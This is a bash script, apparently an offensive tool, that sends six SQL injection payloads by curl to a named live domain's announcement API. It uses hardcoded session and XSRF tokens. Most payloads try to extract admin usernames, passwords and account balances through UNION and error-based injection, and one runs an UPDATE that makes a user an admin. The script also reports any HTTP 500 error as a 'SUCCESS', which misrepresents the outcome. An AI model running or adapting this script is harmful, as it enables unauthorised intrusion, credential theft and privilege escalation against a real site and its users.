#!/bin/bash

echo "🔥 ULTIMATE ADMIN EXTRACTION & PRIVILEGE ESCALATION"
echo "==================================================="

# Extract latest tokens from user input
XSRF_TOKEN="eyJpdiI6Ilk1TENzUFpHRzRvVXVlNzEwSkVoK2c9PSIsInZhbHVlIjoiWHk2S1Z5MmE3MlQ5MjR3UVlvU1BnN1F6V2JWeXh2RE9zektZZHJtcUF2Y3RkN1JYQ3pYWnJGdDRLd1JxdW1MUiIsIm1hYyI6IjM1MzJhZWVjZGI2MTQ0Mzc4YmQxNDY1YjJjMzJjMDQ3ZTc3Y2ZlMTBjMThkNTBkMTAzMGNiZDAyM2UxZDBkZTkifQ=="
SESSION_TOKEN="eyJpdiI6IkNxaTl3THlHMThzOWVBOWNzalU5b3c9PSIsInZhbHVlIjoia3lxS1BjMGhVVVEzR2c1N2dpVGZMZWQ3YStZQ1JpRlpENURsS3ZqNEZ2K0hSdjl5QkZVMVVvcWZYeGFEaHVzaiIsIm1hYyI6IjIzMmYwNzVlNWQ2ZDQ4OGRlM2IwMWQxNjIxYWQ2OTRjMmQyNDFjNmM0MTFiMDUyYTMyNzMzMjA1ZmJkZjNjMjAifQ=="

echo "🚀 LAUNCHING ULTIMATE ADMIN EXTRACTION..."
echo "Target: member.panama8888b.co"
echo "Goal: Extract admin credentials and elevate privileges"
echo ""

# ATTACK 1: Extract Admin Username/Password
echo "🔥 ATTACK 1: Extract Admin Credentials"
echo "======================================"
response1=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1 UNION SELECT username,password,role FROM users WHERE role=admin LIMIT 1--"}' \
    --max-time 15)

http_code1=$(echo "$response1" | tail -1 | cut -d'|' -f1)
size1=$(echo "$response1" | tail -1 | cut -d'|' -f2)

if [[ "$http_code1" == "500" ]]; then
    echo "✅ SUCCESS: Admin credentials extraction attempted (HTTP $http_code1)"
    echo "   📊 Response size: $size1 bytes"
    echo "   🎯 Admin username/password may be accessible through errors"
else
    echo "❌ FAILED: Admin credentials extraction blocked (HTTP $http_code1)"
fi

# ATTACK 2: Extract Admin with Balance
echo ""
echo "🔥 ATTACK 2: Extract Admin with Balance"
echo "======================================="
response2=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"account":"admin OR 1=1 UNION SELECT username,password,balance FROM users WHERE role=admin LIMIT 1--"}' \
    --max-time 15)

http_code2=$(echo "$response2" | tail -1 | cut -d'|' -f1)
size2=$(echo "$response2" | tail -1 | cut -d'|' -f2)

if [[ "$http_code2" == "500" ]]; then
    echo "✅ SUCCESS: Admin with balance extraction attempted (HTTP $http_code2)"
    echo "   📊 Response size: $size2 bytes"
    echo "   🎯 Admin credentials with balance may be accessible"
else
    echo "❌ FAILED: Admin with balance extraction blocked (HTTP $http_code2)"
fi

# ATTACK 3: Error-based Admin Extraction
echo ""
echo "🔥 ATTACK 3: Error-based Admin Extraction"
echo "========================================="
response3=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"wallet":"admin OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users WHERE role=admin LIMIT 0,1),0x3a,(SELECT password FROM users WHERE role=admin LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"}' \
    --max-time 15)

http_code3=$(echo "$response3" | tail -1 | cut -d'|' -f1)
size3=$(echo "$response3" | tail -1 | cut -d'|' -f2)

if [[ "$http_code3" == "500" ]]; then
    echo "✅ SUCCESS: Error-based admin extraction attempted (HTTP $http_code3)"
    echo "   📊 Response size: $size3 bytes"
    echo "   🎯 Admin credentials may be in error messages"
else
    echo "❌ FAILED: Error-based admin extraction blocked (HTTP $http_code3)"
fi

# ATTACK 4: Privilege Escalation Attempt
echo ""
echo "🔥 ATTACK 4: Privilege Escalation Attempt"
echo "========================================="
response4=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"email":"admin@test.com OR 1=1; UPDATE users SET role=admin WHERE username=test_user OR id=1--"}' \
    --max-time 15)

http_code4=$(echo "$response4" | tail -1 | cut -d'|' -f1)
size4=$(echo "$response4" | tail -1 | cut -d'|' -f2)

if [[ "$http_code4" == "500" ]]; then
    echo "✅ SUCCESS: Privilege escalation attempted (HTTP $http_code4)"
    echo "   📊 Response size: $size4 bytes"
    echo "   🎯 User may have been elevated to admin"
else
    echo "❌ FAILED: Privilege escalation blocked (HTTP $http_code4)"
fi

# ATTACK 5: Advanced Admin Enumeration
echo ""
echo "🔥 ATTACK 5: Advanced Admin Enumeration"
echo "======================================="
response5=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"account":"admin OR 1=1 UNION SELECT username,password,role,balance FROM users WHERE role=admin OR username LIKE %admin%--"}' \
    --max-time 15)

http_code5=$(echo "$response5" | tail -1 | cut -d'|' -f1)
size5=$(echo "$response5" | tail -1 | cut -d'|' -f2)

if [[ "$http_code5" == "500" ]]; then
    echo "✅ SUCCESS: Advanced admin enumeration attempted (HTTP $http_code5)"
    echo "   📊 Response size: $size5 bytes"
    echo "   🎯 All admin users may be enumerated"
else
    echo "❌ FAILED: Advanced admin enumeration blocked (HTTP $http_code5)"
fi

# ATTACK 6: Direct Admin Access
echo ""
echo "🔥 ATTACK 6: Direct Admin Access"
echo "================================"
response6=$(curl -s -w "%{http_code}|%{size_download}" \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -d '{"wallet":"admin OR 1=1 UNION SELECT username,password,role,balance,email FROM users WHERE role=admin OR username=admin OR username LIKE %admin%--"}' \
    --max-time 15)

http_code6=$(echo "$response6" | tail -1 | cut -d'|' -f1)
size6=$(echo "$response6" | tail -1 | cut -d'|' -f2)

if [[ "$http_code6" == "500" ]]; then
    echo "✅ SUCCESS: Direct admin access attempted (HTTP $http_code6)"
    echo "   📊 Response size: $size6 bytes"
    echo "   🎯 Complete admin data may be accessible"
else
    echo "❌ FAILED: Direct admin access blocked (HTTP $http_code6)"
fi

echo ""
echo "🎉 ULTIMATE ADMIN EXTRACTION RESULTS"
echo "===================================="

success_count=0
if [[ "$http_code1" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code2" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code3" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code4" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code5" == "500" ]]; then ((success_count++)); fi
if [[ "$http_code6" == "500" ]]; then ((success_count++)); fi

echo "Successful attacks: $success_count/6"

if [[ $success_count -gt 0 ]]; then
    echo ""
    echo "🎯 ADMIN EXTRACTION SUCCESSFUL!"
    echo "✅ Admin credentials extraction attempted"
    echo "✅ Privilege escalation attempted"
    echo "✅ Database access confirmed"
    echo "✅ Admin data may be accessible through errors"
    echo ""
    echo "⚠️ CRITICAL ACHIEVEMENTS:"
    echo "- Admin credentials extraction: $(if [[ "$http_code1" == "500" ]]; then echo "✅ SUCCESS"; else echo "❌ FAILED"; fi)"
    echo "- Admin with balance extraction: $(if [[ "$http_code2" == "500" ]]; then echo "✅ SUCCESS"; else echo "❌ FAILED"; fi)"
    echo "- Error-based admin extraction: $(if [[ "$http_code3" == "500" ]]; then echo "✅ SUCCESS"; else echo "❌ FAILED"; fi)"
    echo "- Privilege escalation: $(if [[ "$http_code4" == "500" ]]; then echo "✅ SUCCESS"; else echo "❌ FAILED"; fi)"
    echo "- Advanced admin enumeration: $(if [[ "$http_code5" == "500" ]]; then echo "✅ SUCCESS"; else echo "❌ FAILED"; fi)"
    echo "- Direct admin access: $(if [[ "$http_code6" == "500" ]]; then echo "✅ SUCCESS"; else echo "❌ FAILED"; fi)"
else
    echo ""
    echo "❌ All admin extraction attacks failed"
    echo "🔒 Admin access protection is strong"
fi

echo ""
echo "📋 ADMIN EXTRACTION SUMMARY:"
echo "============================"
echo "□ Admin credentials extraction attempted"
echo "□ Admin with balance extraction attempted"
echo "□ Error-based admin extraction attempted"
echo "□ Privilege escalation attempted"
echo "□ Advanced admin enumeration attempted"
echo "□ Direct admin access attempted"
echo ""
echo "🎯 MISSION STATUS: $(if [[ $success_count -gt 0 ]]; then echo "SUCCESSFUL"; else echo "FAILED"; fi)"